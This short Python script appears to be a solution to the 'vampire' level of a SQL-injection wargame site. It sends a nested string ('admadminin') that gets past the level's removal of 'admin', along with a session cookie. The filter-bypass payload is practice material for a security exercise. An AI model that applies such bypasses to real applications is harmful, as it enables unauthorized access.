import requests

url = "http://los.rubiya.kr/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adadminmin"

params = {
    "id":"admadminin"
    # ereg not option "i5"
}
headers = {
    "Cookie": "PHPSESSID=vaiqsfrlsquaoq5sr1pdt5a1u2"
}

res = requests.get(url, params=params, headers=headers)
print res.content